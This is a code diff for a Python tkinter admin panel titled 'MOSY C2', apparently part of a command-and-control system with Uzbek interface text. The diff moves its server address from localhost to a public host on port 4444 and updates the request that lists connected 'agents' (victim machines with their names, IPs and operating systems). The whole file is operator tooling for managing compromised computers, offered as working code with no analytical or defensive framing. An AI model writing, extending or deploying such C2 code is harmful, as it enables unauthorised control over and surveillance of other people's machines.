@@ -1,18 +1,18 @@
 import socket
 import tkinter as tk
-from tkinter import messagebox, ttk
+from tkinter import ttk, messagebox
 from PIL import Image, ImageTk
 
-VPS_IP = '127.0.0.1'  # Server IP manzili
-VPS_PORT = 4444
+SERVER_HOST = 'mosy.onrender.com'
+SERVER_PORT = 4444
 
 class AdminPanel:
     def __init__(self, root):
         self.root = root
-        self.root.title("MOSY C2 - Professional Boshqaruv Markazi")
-        self.root.geometry("900x520")
+        self.root.title("MOSY C2 - Global Boshqaruv Markazi")
+        self.root.geometry("950x550")
         
-        self.status_label = tk.Label(root, text="Serverga ulanishga tayyor", font=("Arial", 11, "bold"), fg="blue")
+        self.status_label = tk.Label(root, text="Markaziy serverga ulanishga tayyor", font=("Arial", 11, "bold"), fg="blue")
         self.status_label.pack(pady=10)
         
         # Jadval
@@ -46,8 +46,8 @@ class AdminPanel:
         
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((VPS_IP, VPS_PORT))
-            s.sendall("ADMIN_REQ_LIST".encode('utf-8'))
+            s.connect((SERVER_HOST, SERVER_PORT))
+            s.sendall("ADMIN_LIST".encode('utf-8'))
             
             response = s.recv(4096).decode('utf-8', errors='ignore')
             s.close()
@@ -60,9 +60,9 @@ class AdminPanel:
                         self.tree.insert("", tk.END, values=(idx, pc_name, ip, os_info, "Online (Faol)"))
                         self.agents_data.append({"pc_name": pc_name, "ip": ip})
                         
-                self.status_label.config(text=f"Topildi: {len(self.agents_data)} ta agent", fg="green")
+                self.status_label.config(text=f"Tarmoqda topildi: {len(self.agents_data)} ta agent", fg="green")
             else:
-                self.status_label.config(text="Tarmoqda faol agentlar yo'q", fg="red")
+                self.status_label.config(text="Hozircha faol agentlar yo'q", fg="red")
         except Exception as e:
             self.status_label.config(text=f"Serverga ulanish xatosi: {str(e)}", fg="red")
 
